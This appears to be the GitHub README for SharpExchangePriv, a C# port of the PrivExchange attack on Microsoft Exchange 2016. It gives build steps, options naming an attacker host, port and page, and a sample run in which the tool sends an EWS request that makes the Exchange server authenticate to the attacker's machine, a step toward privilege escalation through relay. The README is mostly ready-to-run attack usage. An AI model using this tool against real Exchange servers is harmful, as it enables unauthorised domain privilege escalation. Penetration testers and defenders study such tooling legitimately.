# SharpExchangePriv

## Description ##

A C# implementation of PrivExchange by [@_dirkjan](https://twitter.com/_dirkjan). Kudos to [@g0ldenGunSec](https://twitter.com/G0ldenGunSec), as I relied on his code.

It was tested against Exchange 2016.

## Compile Instructions ## 

SharpExchangePriv has been built against .NET 3.5 and is compatible with Visual Studio 2017. Simply open the solution file and build the project.

I used the CommandLineParser in order to parse the arguments. This will create the `CommandLine.dll` file, along with the executable. You can simple merget the .exe and the .dll into one executable file:

`ILMerge.exe /out:C:\SharpExchangePriv.exe C:\Release\SharpExchangePriv.exe C:\Release\CommandLine.dll`

## Usage ##

#### `--targetHost`

Set the IP of the target host.

#### `--attackerHost`

Set the attacker's IP

#### `--attackerPort`

Set the attacker's port

#### `--attackerPage`

Set the attacker's page

#### `--ssl`

Enable SSL

#### `--exchangeVersion`

Set Exchange version, default is 2016

#### `--exchangePort`

Set Exchange target port

## Example ##

```
C:\Users\george.brown\Desktop>SharpExchangePriv.exe --attackerHost 192.168.11.132 --targetHost 192.168.11.10
 /$$$$$$$           /$$            /$$$$$$$$                     /$$
| $$__  $$         |__/           | $$_____/                    | $$
| $$  \ $$ /$$$$$$  /$$ /$$    /$$| $$       /$$   /$$  /$$$$$$$| $$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$
| $$$$$$$//$$__  $$| $$|  $$  /$$/| $$$$$   |  $$ /$$/ /$$_____/| $$__  $$ |____  $$| $$__  $$ /$$__  $$ /$$__  $$
| $$____ /| $$  \__ /| $$ \  $$/$$/ | $$__ /    \  $$$$/ | $$      | $$  \ $$  /$$$$$$$| $$  \ $$| $$  \ $$| $$$$$$$$
| $$     | $$      | $$  \  $$$/  | $$        >$$  $$ | $$      | $$  | $$ /$$__  $$| $$  | $$| $$  | $$| $$_____ /
| $$     | $$      | $$   \  $/   | $$$$$$$$ /$$/\  $$|  $$$$$$$| $$  | $$|  $$$$$$$| $$  | $$|  $$$$$$$|  $$$$$$$
|__/     |__/      |__/    \_/    |________/|__/  \__/ \_______/|__/  |__/ \_______/|__/  |__/ \____  $$ \_______/
                                                                                               /$$  \ $$
                                                                                              |  $$$$$$/
                                                                                               \______ /
                                                                                                            @den_n1s

The target URL is https://192.168.11.10:443/EWS/Exchange.asmx

Sent request to exchange server: https://192.168.11.10:443/EWS/Exchange.asmx

HTTP 200 response received, the target Exchange server should be authenticating shortly.
```

## Contact ##

Please submit any bugs on the Github project page or give me a shout on twitter [@den_n1s](https://twitter.com/den_n1s)
